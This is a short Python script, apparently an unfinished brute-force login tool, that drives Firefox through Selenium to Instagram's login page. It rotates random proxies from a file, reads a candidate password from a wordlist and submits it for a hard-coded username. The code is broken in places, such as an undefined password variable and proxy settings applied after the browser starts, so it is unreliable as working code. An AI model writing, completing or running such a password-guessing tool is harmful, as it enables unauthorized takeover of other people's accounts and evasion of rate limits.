from selenium import webdriver 
import argparse
import time
import random


url='https://www.instagram.com/accounts/login/?force_classic_login'
proxies = open("proxies.txt","r")
proxy_list =[]
for _ in proxies:
    proxy_list.append(_)
#"https://instagram.com")

def login(username):
    firefox_profile = webdriver.FirefoxProfile()
    firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
    browser = webdriver.Firefox()
    f = open("wordlist.txt","r")
    pw = f.readline()
    browser.delete_all_cookies()
    print("[+] deleted all cookies")
    prox = random.choice(proxy_list)
    print(f"[+]using proxy:{prox}\n")
    webdriver.DesiredCapabilities.FIREFOX['proxy']={
           "httpProxy":prox,
            "ftpProxy":prox,
            "sslProxy":prox,
            #"noProxy":None,
            "proxyType":"manual"
        }
    print("[+] opening instagram...")
    browser.get(url)
    time.sleep(2)
    browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
    browser.find_element_by_xpath("//*[@id=\"id_username\"]").send_keys(username)
    browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").send_keys(password)
    try:
        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
        #return 0
        #time.sleep(5)
    except Exception as e:
        #return 1
        print(e)

login("kushalr3ddy")#,"notnoice")